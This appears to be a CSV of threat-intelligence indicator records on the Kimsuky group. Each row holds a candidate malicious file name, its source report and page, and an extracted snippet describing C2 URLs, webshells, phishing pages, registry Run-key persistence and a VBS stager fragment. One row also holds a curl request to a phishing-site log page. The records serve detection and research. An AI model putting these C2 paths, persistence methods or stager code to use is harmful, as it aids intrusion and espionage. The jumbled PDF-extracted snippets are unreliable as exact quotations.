1.0.0,actor--kimsuky,artifact--sha256:9782267751a09fd7820003b9c1af2a7ebc75cf389de5bc95de65df87049c1734,observation--sha256:b7c626bc0ffa41edbafdf2d6eff0dd0917358a4900c7d7b6f730be778b3351de,file-name,ivanti-new-exp-20241220.zip,ivanti-new-exp-20241220.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 578}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,(The file is also included in ivanti-new-exp-20241220.zip),Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:82b609e95073c9bfd8886c58ff91bd07898f03b490a722f7e118e380e817f25f,observation--sha256:6b308aff6921440fb13b05c88ad57e13d492b5a8e81c95f8d30f4a4e5aed7e38,file-name,ja.js,ja.js,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8240c17eee3d968b5013d3e986e0f2c248710aa7d1b0f03b4da61cfd1427a8ad,observation--sha256:aff5d8426778759cecebf30c046c570755e6b0a0086f2c206b74b076f8591768,file-name,keylogger1.ps1,keylogger1.ps1,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
1.0.0,actor--kimsuky,artifact--sha256:1ba613c959df47807c4ccd726f89312eb567d8aa2cde0d8e135dfc2bb62cc110,observation--sha256:9c2499209cf6a77b8512cc76bf206056bec056bff32859920feec878c9043275,file-name,ko.js,ko.js,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cb40188aae265ee7c192e54407acaa3604e8cf0a86617b140748f00193f6c4f4,observation--sha256:3d336b04e92afe79b91373d281bb77619817f3f606e386f02ce732af78e939bd,file-name,koreaglobal.mypremsedge.exe,koreaglobal.mypremsedge.exe,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6381b28ae43d1fdd317ae7272fc7a1bc2ebf97ae091ad78eadb8da2e0f3d33d7,observation--sha256:6bf0b79fa0dc1b65273d45b972f5d0bf118c8ee2bea183c0e73f691a93610399,file-name,lchampion-2.0.0.exe,lchampion-2.0.0.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d56f67f35d483f2c912622e7ab381489f687014916446110b036abc59ce804e2,observation--sha256:56ff814a719403283bd8415378507a8572f0da26416768448a88793bb1cafbcc,file-name,lib(2).php,lib(2).php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:17def4f1c21b2185be19c4aa8bceb1af1963ae9c69934859d89d80ea35ba92df,observation--sha256:0dfa88def4c2dc0a7e9898fa4c637a609d6d0fd7530947d205918443d6dc820a,file-name,lib.php,lib.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"It has the same structure, and the malicious code downloaded varies depending on the number attached to list.php and lib.php. This means that both PHPs have malware file names mapped to numbers followed by them. Also, sqlite.zip is a file that the malicious code mapped to the number attached to the end of the file downloads additionally for normal execution. On March 20, 2023, a joint security advisory issued by the National Intelligence Service (NIS) and the German Constitutional Protection Age",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:17def4f1c21b2185be19c4aa8bceb1af1963ae9c69934859d89d80ea35ba92df,observation--sha256:382106671a9e90e33596ede31a4f7a41eaac086da8082144beb4f76fb58ac984,file-name,lib.php,lib.php,candidate,2023-02-09T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"This operation was named ""Operation Covert Stalker"" in that it secretly and persistently hacked to achieve success. ÿ To ensure continuity of connection , create an account for RDP access and install additional remote management programs such as RDP Wrapper, Quasar RAT, Ammy RAT, AnyDesk, and TeamViewer. I did. It also explained the basis on which AhnLab judged that the Kimsuky organization was responsible. ÿ Various malicious actions such as searching for hacking targets, sending hacking emails",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:17def4f1c21b2185be19c4aa8bceb1af1963ae9c69934859d89d80ea35ba92df,observation--sha256:7f20bc184b119832a508659da76d0e0085dd64dca4c78171fe474a90a2bc1368,file-name,lib.php,lib.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 75}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"It is designed to delete code and leave logs. For example, list.php?query=20 is an argument value that does not exist in list.php above (Figure 59), so list.php deletes all malicious code existing in C2 and logs as shown below (Figure 60). Leave it as a file. We believe that the Kimsuky organization created list.php and lib.php in this way to take into account the characteristics of analysts. We need to wait and see whether it has the potential to be used. 75 Since we believe it is not the targe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:da9c34aa63f6c1301fdb2e2b54c273c43b7cfcca5fa7aa61c5a7d983c4c7a71d,observation--sha256:0ef82bab432dcd366aebc8c46886af65d52aa51fe830ede20bb4c7c24c9f0429,file-name,list(2).php,list(2).php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:070d6b314beae66cff6519e4d93ae6cd292144f893d8e9a9c0cdb3f752338fed,file-name,list.php,list.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:451c6b5670d3c8b4236afdca309386e7a9400a3e9abed51d110e1338bbb9d691,file-name,list.php,list.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 39}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"It has the same structure, and the malicious code downloaded varies depending on the number attached to list.php and lib.php. This means that both PHPs have malware file names mapped to numbers followed by them. Also, sqlite.zip is a file that the malicious code mapped to the number attached to the end of the file downloads additionally for normal execution. On March 20, 2023, a joint security advisory issued by the National Intelligence Service (NIS) and the German Constitutional Protection Age",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:5bdeaf80389e759391502f2fe05874b13e53eb8afb4e030c519353fa65a305ef,file-name,list.php,list.php,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:5412d3a9e6a444d6426223745c9c685004ed6478723dad953814cf556a5c4817,file-name,list.php,list.php,candidate,2022-10-11T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 73}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"When running on the system, download /list.php?query=6 (normal_sc.txt) is performed every 60 minutes. LOG_ID_WEB_ if(!(($ip == ""21*.4*.10*.25*"")||($ip == ""17*.12*.16*.15*""))) if(!(($ip == ""21*.4*.10*.25*"")||($ip == ""17*.12*.16*.15*""))) malware_path LOG_ID_WEB_ 20230518094217 koreaglobal.mypressonline.com/file/upload/list.php?query=6 (Table 41) Log of blocking access to malicious code distribution sites for 17*.11*.14*.18*(KR) koreaglobal.mypressonline.com IP diagnosis time condition exit(0); MAL",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:8a528837f842694eab0df28ebb16095a4e908c3eba2d0bbc2dcde7cbf148feae,file-name,list.php,list.php,candidate,2023-05-09T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 74}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"You must log in to view and download attached files, which means that this action was successful. (Table 42) Access ****Lab webmail at 17*.11*.14*.18*(KR) data file It is possible to distribute malware in a limited way after identifying the IP or IP band, but the Kimsuky organization has not yet done so. The presence of IP filtering in list.php is unusual. The possibility is low, and malware infection would have been checked and taken action. There is one additional feature. Below (table http://",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:c51a26ed17dfb8500f1e37407a672d85448d8984d97299fd9fe0baed6680fec2,file-name,list.php,list.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 75}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"It is designed to delete code and leave logs. For example, list.php?query=20 is an argument value that does not exist in list.php above (Figure 59), so list.php deletes all malicious code existing in C2 and logs as shown below (Figure 60). Leave it as a file. We believe that the Kimsuky organization created list.php and lib.php in this way to take into account the characteristics of analysts. We need to wait and see whether it has the potential to be used. 75 Since we believe it is not the targe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:c86f40ee2fcc08084e991833863ff4375f2c5d516e6beb90e00929b5bdb9ddb9,file-name,list.php,list.php,candidate,2020-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 76}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"TARGET2CURRENT_PROCESSTIME TARGET1PARENT_PROCESS 11:27:59 0.0.0.0:57318 This is an IP to which a phishing URL impersonating the Ministry of Unification has been mapped, and recently, a URL for Naver phishing has been mapped as well. There are also many malicious URLs mapped. 2020.08 ~ 2020.09 2020.12 ~ 2021.03 There is evidence that the Kimsuky organization attempted to connect to 78 IPs through RDP at a domestic transit point (KR) from February 2023 to April 2023. mstsc.exe %systemroot%\system3",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:f5edca4a73e2f1133516e8bb045878088799a5a1f25cbf2ca3806c640dd6fca8,file-name,list.php,list.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:749d59c4be6d550ca3110089e61b457c0669725bac30df888ffcdd4abd39038d,file-name,list.php,list.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3ca10434c5c83763acde629a889b2daa16c94edcdf7b825f8aac29c120df0681,observation--sha256:52634fea462060f8e56207ab3be1e54a218fcf6dd8cdd5edd8d95160f0b432d9,file-name,list.xls,list.xls,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20]. 响应 C2 服务器远程指令 命令 动作 1 会提醒用户更新并进行更新操作 2 创建了 list.xls 和 zip.dat ，并遍历/sdcard 目录及其子文件夹下的 所有文件，把文件信息写入了 list.xls 3 上传指定的文件 4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果 写入 cmd_xxxxx.txt ,经过相同的伪装，调用 c.d() 上传 5 创建 sms.txt ，调用安卓短信协议，获取信息写入 sms.txt 6 清除 app 的数据 7 清除 app 的缓存 8 发送短信 3.5 攻击韩国原子能研究所 韩国新闻媒体《朝鲜日报》近日报道韩国原子能研究院于 5 月 14 日遭到朝鲜 APT 组 织 Kimsuky 攻击。韩国原子能研究院拥有核电站、核燃料等重要国防资料。根据披露信息 显示，攻击者利用原子能研究院 VPN 设备漏洞进入内网，使用了 13 个未经授权的外部 IP 访问 VPN 内部网络。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0d74da5cd9b4d0a99d5e9abc3d0d26b2041bd9a098891676a1528b40623d202c,observation--sha256:beae8bb60d320d0f77284c3eddab20631406650a6fa380ca5c3d99bd3bbc30d6,file-name,list[1].php,list[1].php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f1b4a11bc114fa51b10d8af5c311962b69c5dc4fb454e5900931c039fcff5570,observation--sha256:89d8567e4540e0033fb3a6fc40ef4c8d41c45f685e21b6f08e6857dd0acd316d,file-name,(.lnk,lnk,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"domain_x64.dll hxxps://www.bleepingcomputer.com/news/security/microsoft-to-kill-off-vbscript-in-windows-to-block- Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands Diagnostic Time File Name 2023-02-24 Removing VBS will not have a significant impact on hacking organizations. The reason is that even if the hacking organization is not VBS, hxxps://learn.microsoft.com/en-us/windows/whats-new/deprecated-features The malicious code ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f094be8d787940671d840e659795f94f4ee2874efd49443e7e3768b9f18ef044,observation--sha256:e70e16142ee7cbc6c8b0d7cb4786951c3d122729563397be926725559d23c2be,file-name,logs.php,logs.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 411}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/logs.php",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e8faf95b2ba1b4ca1ca12d944dcd9d066ff37190e69db7306e0d27edd32a572a,observation--sha256:f18c777dcd951edd8b966bd5eaf7dae0ad5e171c27fd680e0c62fbd05bd7fae3,file-name,lsass.exe,lsass.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:39f4b70f8efc869f7c183df0b5c4eb06af34287194f32eab0ab2d89570f4c4aa,observation--sha256:57d996a522d1d3e5758cd7aa2473cd3c7c545db1cf1537db2fa88048283f6bf0,file-name,mail.php,mail.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--66d8611f88a6a292,kimsuky/Exploit Weak DMARC.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | State | NSA TLP:CLEAR Page 6 of 9 | Product ID: JCSA-20240502-001 JCSA-20240502-001 JCSA-502-001 TLP:CLEAR Sample Email Header 1: In the sample email header below, all referenced portions are highlighted. The email returns a “pass” for the corresponding SPF and DKIM checks, implying the North Korean actor was successful in gaining access to a university’s legitimate email client to send the email. The DMARC protocol returns as “fail” because the sender’s email domain—presented as the domai",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:39f4b70f8efc869f7c183df0b5c4eb06af34287194f32eab0ab2d89570f4c4aa,observation--sha256:0861fa0c7e748d7fd8e542a4d4f4d6bc1fb2790bbd2a80caff0b07265a50ab8f,file-name,mail.php,mail.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--66d8611f88a6a292,kimsuky/Exploit Weak DMARC.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | State | NSA TLP:CLEAR Page 8 of 9 | Product ID: JCSA-20240502-001 JCSA-20240502-001 JCSA-502-001 TLP:CLEAR Sample Email Header 2: In this case, the North Korean actor is able to exploit the absence of a DMARC policy that would have authenticated the sending email address against the SPF check. The North Korean actor spoofed both the name of a legitimate journalist and the real email domain of that journalist’s news media outlet as given in the “From” and “Sender” portions of the email’s he",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:82396395bd438667c680302d447667723875e3350a42c5b781f3ad978a19bbeb,observation--sha256:8dd7e5b9ef73ccac64d2e9585fe963052b9e430589649050578237f92410e1e6,file-name,mail_ok.php,mail_ok.php,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 9}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 9VIRUS BULLETIN CONFERENCE OCTOBER 2021 3.1 Phishing: spear-phishing link When browsing the email, it looks like it contains simple text (‘>> erroneous sending email’), but in fact it contains HTML code. One of the problems was that when the email was read on the webmail service, it was moved to the phishing page configured by the attacker.  Mailing Toolkit (phishing email sending URL): wallet-info.esy.es/mail_ok.php  S",
1.0.0,actor--kimsuky,artifact--sha256:5180afe04c2e57da506e57f2acb85f3514c5dc0882bf3e030687316665750d53,observation--sha256:3ef630fd61a49d16b1f437b3afec42c1a1f23b91105ecefedf12973963d9f00b,file-name,main.php,main.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
